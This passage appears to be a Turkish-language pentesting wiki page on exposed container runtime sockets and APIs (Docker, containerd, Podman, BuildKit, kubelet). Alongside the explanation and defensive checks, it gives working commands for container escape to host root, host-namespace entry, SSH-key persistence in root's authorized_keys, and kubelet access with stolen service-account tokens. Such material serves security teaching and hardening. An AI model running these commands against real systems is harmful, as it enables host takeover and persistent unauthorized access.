# Runtime API ve Daemon Exposure

## Genel Bakış

Gerçek container ihlallerinin çoğu namespace escape ile hiç başlamaz. Bunun yerine runtime control plane'e erişimle başlar. Bir workload, bağlı bir Unix socket veya açığa çıkarılmış bir TCP listener üzerinden `dockerd`, `containerd`, CRI-O, Podman ya da kubelet ile iletişim kurabiliyorsa saldırgan daha yüksek ayrıcalıklara sahip yeni bir container oluşturabilir, host filesystem'ını mount edebilir, host namespace'lerine katılabilir veya hassas node bilgilerini alabilir. Bu durumlarda gerçek security boundary runtime API'dir ve bunun compromise edilmesi işlevsel olarak host'un compromise edilmesine yakındır.

Runtime socket exposure'ın kernel protections'tan ayrı olarak belgelenmesinin nedeni budur. Ordinary seccomp, capabilities ve MAC confinement kullanan bir container bile, `/var/run/docker.sock` veya `/run/containerd/containerd.sock` içine mount edilmişse host compromise'dan yalnızca tek bir API call uzakta olabilir. Mevcut container'ın kernel isolation'ı tam olarak tasarlandığı gibi çalışıyor olabilir; ancak runtime management plane tamamen exposed durumda kalır.

## Daemon Access Models

Docker Engine, privileged API'sini geleneksel olarak `unix:///var/run/docker.sock` adresindeki yerel Unix socket üzerinden expose eder. Geçmişte ayrıca `tcp://0.0.0.0:2375` gibi TCP listener'lar veya `2376` üzerindeki TLS-protected listener üzerinden remote olarak da expose edilmiştir. Daemon'ı güçlü TLS ve client authentication olmadan remote olarak expose etmek, Docker API'yi fiilen remote root interface'e dönüştürür.

containerd, CRI-O, Podman ve kubelet de benzer yüksek etkili attack surface'ler expose eder. İsimler ve workflow'lar farklıdır, ancak mantık değişmez. Interface caller'ın workload oluşturmasına, host path'lerini mount etmesine, credential'ları almasına veya çalışan container'ları değiştirmesine izin veriyorsa bu interface privileged bir management channel'dır ve buna uygun şekilde ele alınmalıdır.

Kontrol edilmesi gereken yaygın yerel path'ler şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha özel stack'ler `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi endpoint'ler de açığa çıkarabilir. Bunlar modern ortamlarda daha az yaygındır; ancak karşılaşıldıklarında sıradan application socket'leri yerine runtime-control yüzeylerini temsil ettikleri için aynı dikkatle ele alınmalıdır.

## Güvenli Remote Access

Bir daemon local socket'in ötesinde açığa çıkarılacaksa bağlantı TLS ile korunmalı ve tercihen mutual authentication kullanılmalıdır; böylece daemon client'ı, client da daemon'ı doğrular. Docker daemon'ını kolaylık amacıyla plain HTTP üzerinden açma alışkanlığı, container yönetimindeki en tehlikeli hatalardan biridir; çünkü API yüzeyi doğrudan privileged container'lar oluşturabilecek kadar güçlüdür.

Geçmişte kullanılan Docker configuration pattern'i şöyle görünüyordu:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd tabanlı host'larda daemon iletişimi `fd://` olarak da görünebilir; bu, işlemin soketi doğrudan kendisinin bağlaması yerine systemd'den önceden açılmış bir soketi devraldığı anlamına gelir. Buradaki önemli ders tam söz dizimi değil, güvenlik sonucudur. Daemon, sıkı izinlerle korunan yerel bir soketin ötesinde dinlemeye başladığı anda aktarım güvenliği ve client authentication, isteğe bağlı hardening olmaktan çıkarak zorunlu hâle gelir.

## Abuse

Bir runtime socket mevcutsa hangisi olduğunu, uyumlu bir client bulunup bulunmadığını ve raw HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Bu komutlar, geçersiz bir path, mount edilmiş ancak erişilemeyen bir socket ve çalışan ayrıcalıklı bir API arasındaki farkı belirlemek için kullanışlıdır. Client başarılı olursa sıradaki soru, API'nin host bind mount veya host namespace paylaşımıyla yeni bir container başlatıp başlatamayacağıdır.

### Client Yüklü Değilken

`docker`, `podman` veya başka bir kullanıcı dostu CLI'ın bulunmaması socket'in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket'i üzerinden HTTP kullanır ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de Libpod-native bir API sunar. Bu, yalnızca `curl` bulunan minimal bir ortamın bile daemon'u kontrol etmek için yeterli olabileceği anlamına gelir:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Bu, post-exploitation sırasında önemlidir; çünkü savunmacılar bazen alışılmış client binary'lerini kaldırır, ancak management socket'i mount edilmiş halde bırakır. Podman host'larında, yüksek değerli path'in rootful ve rootless deployment'lar arasında farklı olduğunu unutmayın: rootful service instance'lar için `unix:///run/podman/podman.sock`, rootless olanlar için `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Tam Örnek: Docker Socket ile Host Root

`docker.sock` erişilebilirse, klasik escape yöntemi host root filesystem'ini mount eden yeni bir container başlatmak ve ardından `chroot` ile içine girmektir:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon üzerinden doğrudan host-root execution sağlar. Etki yalnızca dosya okumayla sınırlı değildir. Yeni container'ın içine girdikten sonra attacker, host dosyalarını değiştirebilir, credentials toplayabilir, persistence yerleştirebilir veya ek privileged workload'lar başlatabilir.

### Full Example: Docker Socket To Host Namespaces

Attacker filesystem-only access yerine namespace entry'yi tercih ederse:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, mevcut container'ı exploit etmek yerine runtime'dan açıkça host namespace exposure ile yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Docker Socket Persistence Pattern

Runtime control, one-shot shell yerine persistence için de kullanılabilir. Genel pattern, host mount içeren bir helper container oluşturmak, mount edilmiş host filesystem içine authorized access material veya startup hook yazmak ve ardından host'un bunu tükettiğini doğrulamaktır.

Örnek biçim:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Aynı fikir, operatörün neyi kanıtlamak istediğine bağlı olarak systemd unit'lerini, cron parçalarını, application startup dosyalarını veya SSH key'lerini hedefleyebilir. Önemli nokta, kalıcı değişikliğin original container içindeki ek privilege aracılığıyla değil, runtime daemon'ın host-level filesystem authority'si üzerinden yapılmasıdır.

### Raw Docker API Helper Pivot

Docker CLI eksik olduğunda, aynı host-mount helper flow Unix socket üzerinden HTTP kullanılarak yürütülebilir. Genel flow şöyledir: API'yi doğrula, host bind mount içeren bir helper container oluştur, başlat, bir exec instance oluştur ve bu exec'i başlat.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Son `/exec/<id>/start` isteği, döndürülen exec ID'sine bağlıdır; ancak güvenlik açısından önemli nokta, kullanılan JSON yapısından bağımsızdır: rootful bir Docker daemon'a ham API erişimi, daha güçlü bir yardımcı workload istemek için yeterlidir.

### Tam Örnek: containerd Socket

Bağlanmış bir `containerd` socket'i genellikle en az bunun kadar tehlikelidir:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Daha Docker benzeri bir client mevcutsa `nerdctl`, `--privileged`, `--pid=host` ve `-v` gibi tanıdık flag'leri sunduğu için `ctr`'den daha kullanışlı olabilir:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Etki yine host compromise'dır. Docker'a özgü araçlar mevcut olmasa bile başka bir runtime API'si aynı yönetimsel yetkileri sunabilir. Kubernetes node'larında `crictl`, CRI endpoint'iyle doğrudan iletişim kurduğu için reconnaissance ve container etkileşimi için de yeterli olabilir.

### BuildKit Socket

`buildkitd`, çoğu kişi onu genellikle "sadece build backend'i" olarak gördüğü için kolayca gözden kaçırılır; ancak daemon hâlâ ayrıcalıklı bir control plane'dir. Erişilebilir bir `buildkitd.sock`, saldırgana arbitrary build step'leri çalıştırma, worker yeteneklerini inceleme, compromise edilmiş environment içindeki local context'leri kullanma ve daemon bunlara izin verecek şekilde yapılandırılmışsa `network.host` veya `security.insecure` gibi tehlikeli entitlement'lar talep etme olanağı sağlayabilir.

İlk olarak yapılabilecek faydalı etkileşimler şunlardır:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Daemon build isteklerini kabul ediyorsa, güvenli olmayan entitlements öğelerinin kullanılabilir olup olmadığını test edin:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Kesin etki daemon yapılandırmasına bağlıdır, ancak permissive entitlements ile çalışan rootful bir BuildKit servisi zararsız bir developer kolaylığı değildir. Özellikle CI runners ve paylaşılan build node'larında bunu başka bir yüksek değerli yönetim yüzeyi olarak değerlendirin.

### TCP Üzerinden Kubelet API'si

Kubelet bir container runtime değildir, ancak yine de node yönetim düzleminin bir parçasıdır ve çoğu zaman aynı trust boundary tartışmasının içinde yer alır. Kubelet secure port `10250` workload'dan erişilebiliyorsa veya node kimlik bilgileri, kubeconfig'ler ya da proxy hakları açığa çıkmışsa attacker, Kubernetes API server admission path'ine hiç dokunmadan Pod'ları enumerate edebilir, log'ları alabilir veya node-local container'larda komut çalıştırabilir.

Kolay keşifle başlayın:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Kubelet veya API-server proxy path `exec` yetkisi veriyorsa, WebSocket destekli bir client bunu node üzerindeki diğer container'larda code execution gerçekleştirmek için kullanabilir. `nodes/proxy` için yalnızca `get` yetkisinin kulağa geldiğinden daha tehlikeli olmasının nedeni de budur: istek yine de command çalıştıran kubelet endpoint'lerine ulaşabilir ve bu doğrudan kubelet etkileşimleri normal Kubernetes audit log'larında görünmez.<sup>[[2]](#references)</sup>

## Kontroller

Bu kontrollerin amacı, container'ın trust boundary'nin dışında kalması gereken herhangi bir management plane'e erişip erişemediğini belirlemektir.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Burada ilginç olanlar:

- Bağlanmış bir runtime socket'i genellikle yalnızca bilgi ifşası değil, doğrudan bir administrative primitive'dir.
- TLS olmadan `2375` üzerinde dinleyen bir TCP listener, remote-compromise durumu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi environment variable'lar genellikle workload'un host runtime ile iletişim kurmak üzere kasıtlı olarak tasarlandığını ortaya çıkarır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak local Unix socket | `dockerd`, local socket üzerinde dinler ve daemon genellikle rootful'dur | `/var/run/docker.sock` bağlamak, `tcp://...:2375` açığa çıkarmak, `2376` üzerinde zayıf veya eksik TLS |
| Podman | Varsayılan olarak Daemonless CLI | Sıradan local kullanım için uzun süre çalışan ayrıcalıklı bir daemon gerekli değildir; `podman system service` etkinleştirildiğinde API socket'leri yine de açığa çıkarılabilir | `podman.sock` açığa çıkarmak, service'i geniş kapsamlı çalıştırmak, rootful API kullanımı |
| containerd | Local ayrıcalıklı socket | Administrative API, local socket üzerinden açığa çıkarılır ve genellikle üst düzey tooling tarafından kullanılır | `containerd.sock` bağlamak, geniş `ctr` veya `nerdctl` erişimi, ayrıcalıklı namespace'leri açığa çıkarmak |
| CRI-O | Local ayrıcalıklı socket | CRI endpoint'i node-local güvenilir bileşenler için tasarlanmıştır | `crio.sock` bağlamak, CRI endpoint'ini güvenilmeyen workload'lara açığa çıkarmak |
| Kubernetes kubelet | Node-local yönetim API'si | Kubelet, Pods içinden geniş kapsamlı şekilde erişilebilir olmamalıdır; kimlik doğrulama ve yetkilendirmeye bağlı olarak erişim pod durumunu, credential'ları ve execution özelliklerini açığa çıkarabilir | kubelet socket'lerini veya sertifikalarını bağlamak, zayıf kubelet auth, host networking ile erişilebilir kubelet endpoint'i |

## References

- [1] [containerd socket exploitation bölüm 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server bypass riskleri](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
